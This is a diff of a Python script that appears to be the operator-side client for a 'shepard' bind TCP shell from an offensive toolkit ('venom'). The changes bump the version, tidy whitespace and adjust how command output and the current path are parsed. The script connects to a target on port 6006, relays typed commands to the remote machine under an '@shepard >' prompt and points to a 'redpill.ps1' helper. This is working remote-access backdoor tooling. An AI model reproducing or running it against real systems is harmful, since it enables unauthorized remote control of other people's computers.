@@ -2,25 +2,22 @@
 # Author: @d3adzo (bind TCP shell)                   #
 # revision: @r00t-3xp10it (@venom)                   #
 # shepard working directory: %tmp%                   #
-# Python Script (SERVER) version: 1.0.3              #
+# Python Script (SERVER) version: 1.0.4              #
 ######################################################
-
 
 ## Imports
 import socket, sys, time, os
 from os import system
 
-
 ## shell settings
 host = sys.argv[1]
 port = 6006
-
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 try:
     s.connect((host, port))
 except:
-    print('[error] could not connect to: ' + host + ' on: 6006 tcp') ## TypeError: can only concatenate str (not "int") to str
+    print('[error] could not connect to: ' + host + ' on: 6006 tcp')
     time.sleep(2) ## Added sleep time!
     exit()
 
@@ -35,9 +32,9 @@ while True:
     while 'EOFX' not in data.decode():
         data += s.recv(4096)
     datarr = data.decode().split('\r\n')
-    for line in datarr[:-5]:
+    for line in datarr[:-3]:
         print(line)
-    print("Current path : " + datarr[-5])
+    print("Current path: " + datarr[-3])
     print("Shell options: powershell -file redpill.ps1 -help parameters")
     nextcmd = input("@shepard > ")
     if nextcmd == 'cls':
